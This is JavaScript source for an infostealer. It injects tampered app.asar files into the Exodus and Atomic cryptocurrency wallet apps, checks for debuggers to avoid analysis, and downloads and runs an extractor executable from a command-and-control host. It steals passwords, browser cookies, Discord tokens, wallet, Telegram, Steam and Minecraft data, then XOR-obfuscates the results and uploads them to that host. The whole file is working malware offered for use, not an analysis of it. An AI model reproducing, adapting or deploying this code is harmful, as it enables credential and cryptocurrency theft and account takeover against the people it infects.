const Injection = {
  payload: async (logId, target) => {
    const url = `${CONFIG.HOST_URL}/${target}`;
    try {
      const { data } = await axios.get(url, { responseType: "arraybuffer" });
      let appPath;
      if (target === "exodus") {
        const base = path.join(process.env.LOCALAPPDATA, "exodus");
        if (!fs.existsSync(base)) return;
        const apps = fs.readdirSync(base).filter((f) => f.startsWith("app-"));
        if (!apps.length) return;
        appPath = path.join(base, apps[0], "resources", "app.asar");
      } else if (target === "atomic") {
        appPath = path.join(
          process.env.LOCALAPPDATA,
          "Programs",
          "atomic",
          "resources",
          "app.asar",
        );
      }
      if (appPath && fs.existsSync(appPath)) {
        Utils.kill(target === "exodus" ? "exodus.exe" : "Atomic Wallet.exe");
        fs.writeFileSync(appPath, data);
        const license =
          target === "exodus" ? "LICENSE" : "LICENSE.electron.txt";
        fs.writeFileSync(
          path.join(path.dirname(appPath), "..", license),
          logId,
        );
      }
    } catch {}
  },
};

const Stealth = {
  isDebugged: () => {
    try {
      if (
        process.execArgv.some(
          (arg) => arg.includes("--inspect") || arg.includes("--debug"),
        )
      )
        return true;
      const netstat = Utils.exec('netstat -an | findstr "9229 9230 5858 5859"');
      if (netstat.includes("LISTENING")) return true;
    } catch {}
    return false;
  },
  evade: async () => {
    if (Stealth.isDebugged()) process.exit(0);
    return true;
  },
};

const SystemInfo = {
  gather: async () => {
    try {
      const { data: ip } = await axios.get(`${CONFIG.HOST_URL}/p`);
      DataStore.systemInfo = {
        ip,
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpu: os.cpus()[0].model,
        ram: Math.round(os.totalmem() / 1024 ** 3) + " GB",
        gpu:
          Utils.exec("wmic path win32_VideoController get name")
            .split("\n")[1]
            ?.trim() || "Unknown",
        os: `${os.type()} ${os.release()}`,
        username: os.userInfo().username,
        hwid:
          Utils.exec("wmic csproduct get uuid").split("\n")[1]?.trim() ||
          "Unknown",
      };
    } catch {
      DataStore.systemInfo = { error: "Failed to gather system info" };
    }
  },
};

// ==========================================
// 10. DELIVERY TO C2
// ==========================================

const Security = {
  obfuscate: (data) => {
    const str = JSON.stringify(data);
    const key = CONFIG.SECRET_KEY;
    const result = Buffer.alloc(str.length);
    for (let i = 0; i < str.length; i++)
      result[i] = str.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    return result.toString("base64");
  },
};

const Delivery = {
  createLog: async () => {
    const payload = {
      passwordcount: DataStore.passwords.length,
      cookiecount: DataStore.cookies.length,
      discordtokencount: DataStore.tokens.length,
      filenames: fs.readdirSync(CONFIG.STORAGE_PATH),
    };
    for (let i = 0; i < 10; i++) {
      try {
        const { data } = await axios.post(`${CONFIG.HOST_URL}/init`, payload, {
          headers: {
            "X-UID": CONFIG.USER_ID,
            "Content-Type": "application/json",
          },
        });
        return data.log_uuid;
      } catch {
        await new Promise((r) => setTimeout(r, 1000));
      }
    }
    return "";
  },
  uploadData: async (logId) => {
    const data = {
      passwords: DataStore.passwords,
      cookies: DataStore.cookies,
      discord_tokens: DataStore.tokens,
      refresh_tokens: DataStore.webData,
      system: DataStore.systemInfo,
    };
    const payload = { payload: Security.obfuscate(data) };
    try {
      await axios.post(`${CONFIG.HOST_URL}/v2/data`, payload, {
        headers: { "X-Session-ID": logId, "Content-Type": "application/json" },
      });
    } catch {}
  },
  uploadFiles: async (logId) => {
    const files = fs.readdirSync(CONFIG.STORAGE_PATH);
    for (const file of files) {
      const filePath = path.join(CONFIG.STORAGE_PATH, file);
      if (fs.statSync(filePath).size > 10 * 1024 * 1024) continue;
      for (let i = 0; i < 10; i++) {
        try {
          const formData = new FormData();
          formData.append("file", fs.createReadStream(filePath));
          await axios.post(`${CONFIG.HOST_URL}/log_files`, formData, {
            headers: { ...formData.getHeaders(), "X-Session-ID": logId },
          });
          break;
        } catch {
          await new Promise((r) => setTimeout(r, 1000));
        }
      }
    }
  },
};

// ==========================================
// 11. MAIN ORCHESTRATOR
// ==========================================

async function main() {
  ensureAdmin(); // No await – this will exit if not admin

  // From here on, the script is running elevated
  // await Stealth.evade();

  // Download main.exe from C2 into a random temp folder
  const { exePath, tempDir } = await downloadMainExe();

  // Run it and get the output.zip path
  const outputZipPath = await runMainExtractorFromTemp(exePath, tempDir);
  if (outputZipPath) {
    await parseOutputZip(outputZipPath);
    // Clean up temp folder after parsing
    fs.removeSync(tempDir);
  } else {
    // console.error('[-] Failed to run main.exe, browser data extraction skipped');
  }

  fs.ensureDirSync(CONFIG.STORAGE_PATH);
  await SystemInfo.gather();
  //console.log('[+] System info gathered');

  // Extract Discord tokens (local storage)
  await extractDiscordTokens();
  //console.log('[+] Discord tokens extracted');
  await sendDiscordTokensToServer();

  // Discord injection (live capture)
  await dcinject();
  //console.log('[+] Discord injection applied');

  // Additional data collection
  await Discovery.searchFiles(CONFIG.STORAGE_PATH);
  await Discovery.scanWallets(CONFIG.STORAGE_PATH);
  await Discovery.extractTelegram(CONFIG.STORAGE_PATH);
  await Discovery.extractMinecraft(CONFIG.STORAGE_PATH);
  await Discovery.extractSteam(CONFIG.STORAGE_PATH);
  //console.log('[+] Additional data collected');

  const logId = await Delivery.createLog();
  if (logId) {
    await Delivery.uploadData(logId);
    await Delivery.uploadFiles(logId);
    //console.log('[+] Data uploaded to C2');
  }
  fs.removeSync(CONFIG.STORAGE_PATH);
}

main().catch(console.error);
